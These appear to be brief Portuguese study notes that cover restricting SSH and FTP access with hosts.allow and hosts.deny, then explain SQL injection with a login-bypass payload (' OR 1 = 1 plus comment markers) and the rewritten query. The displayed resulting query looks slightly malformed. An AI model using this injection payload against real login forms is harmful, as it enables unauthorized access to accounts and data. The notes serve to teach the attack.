# **Server**
## **Permissoes**
* vim /etc/hosts.allow
    * colocar: 
        * sshd: IP

* no vim /etc/hosts.deny
    * sshd : ALL
    * ftp : ALL
    * vsftpd: ALL

# **Prog**
## **Sql Injection**
> ataque que edita a sql usada para fazer a validacao 
- Nas telas de login por exemplo a sql de login seria:
``` sql
select * from Users where user_id = 'NOME_DO_USUARIO' and password = 'SENHA'
```
- So precisamos aterar o 'NOME_DO_USUARIO' e 'SENHA' por:

NOME_DO_USUARIO =  '' OR 1 = 1; /*  
SENHA = */--
- Como fica:
``` sql
select * from Users where user_id = '''' OR 1 = 1; /* and password = '*/--'
```
